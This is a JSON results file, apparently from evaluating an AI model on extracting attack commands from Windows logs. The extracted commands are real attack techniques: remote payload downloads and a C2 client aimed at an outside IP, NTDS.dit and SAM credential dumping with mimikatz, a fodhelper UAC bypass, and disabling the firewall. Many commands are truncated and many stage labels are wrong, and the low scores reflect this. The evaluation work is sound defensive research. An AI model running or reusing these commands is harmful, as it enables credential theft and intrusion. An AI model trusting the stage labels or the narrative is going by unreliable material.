@@ -1,0 +1,163 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\", ",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \\",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C IEX ((new-object net.webclient).downloadstring(",
+        "stage": "Collection"
+      },
+      {
+        "command": "c:\\\\\\\\\\Users\\\\Administrator\\\\AppData\\\\Local\\\\Temp\\\\ __PSScri",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "cmd.exe /c esentutl.exe /y /vss c:\\\\windows\\\\ntds\\\\ntds.dit /d ",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "C:\\Users\\Administrator\\Desktop\\shell\\T1059.006.py",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "C:\\Users\\Administrator\\Desktop\\shell\\T1059.006.py",
+        "stage": "Execution"
+      },
+      {
+        "command": "certutil.exe -urlcache -split -f http://example.com/x.exe C:\\x.exe",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"net group \"domain admins\" /domain\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1134.001 -TestNumbers 1\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"$input_table = \\",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"echo test >> test.exe\"",
+        "stage": "Persistence"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1003.003\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"{New-Item \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\"\" -Force New-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\"\" -Name \"DelegateExecute\"\" -Value \"\"\" -Force Set-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\"\" -Name \"(default)\"\" -Value \"C:\\Windows\\System32\\cmd.exe\"\" -Force\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"{Start-Process \"C:\\Windows\\System32\\fodhelper.exe}\"}",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "cmd.exe /c reg.exe save hklm\\security c:\\users\\admini~1\\appdata\\local\\temp\\tjbvkjpetfjp\"",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST'-UseBasicParsing -ContentType \"application/json\"\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "certutil -urlcache -split -f  http://124.223.85.207:8082/Test.hta",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powerpsexec c:\\path\\to\\downloaded_payload.exe",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \".\\chromeRemoteServices.ps1\"",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "C:\\WINDOWS\\system32\\cmd.exe /c Netsh Advfirewall show allprofiles &  NetSh Advfirewall?set?allprofiles state off & echo \ufffd\ufffd\ufffd\ufffd\u01fd\ufffd\u0479\u0440\ufffd& pause",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "taskkill  /f /im wordpad.exe",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "start /min sangforcat.exe -v -server https://124.223.85.207:8443",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "sangforcat.exe  -v -server https://124.223.85.207:8443",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1548.002 -TestNumbers 2\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST' -UseBasicParsing -ContentType \\\"application/json\\\"]\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "mimikatz2.exe  lsadump::sam exit",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "msege -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST' -UseBasicParsing -ContentType \\\"application/json\\\"]\"",
+        "stage": "Collection"
+      }
+    ],
+    "narrative": "The attackers initiated their campaign by executing a Python script on the victim machine, which served as the entry point for their subsequent actions. They leveraged PowerShell scripts to establish persistence, collect sensitive information, steal credentials, evade defenses, and communicate with their command and control servers. Notably, they utilized various tools such as Mimikatz2 to extract password hashes and referred to the lsass process to obtain hashes, ultimately dumping the SAM database. Moreover, they employed lateral movement tactics, creating backdoors and establishing reverse proxies to facilitate further exploitation.",
+    "_parse_ok": false,
+    "_cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 87763,
+      "completion_tokens": 7186,
+      "total_tokens": 94949,
+      "wall_clock_s": 106.39,
+      "parse_retries": 1
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.32142857142857145,
+      "recall": 0.23684210526315788,
+      "f1": 0.2727272727272727,
+      "tp": 9,
+      "fp": 19,
+      "fn": 29
+    },
+    "stage": {
+      "precision": 0.14285714285714285,
+      "recall": 0.10810810810810811,
+      "f1": 0.12307692307692308,
+      "tp": 4,
+      "fp": 24,
+      "fn": 33,
+      "recall_partial": 0.16216216216216217
+    },
+    "hallucination_rate": 0.16666666666666666,
+    "cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 87763,
+      "completion_tokens": 7186,
+      "total_tokens": 94949,
+      "wall_clock_s": 106.39,
+      "parse_retries": 1
+    }
+  },
+  "meta": {
+    "variant": "v4_triage",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe",
+    "triage": true
+  }
+}
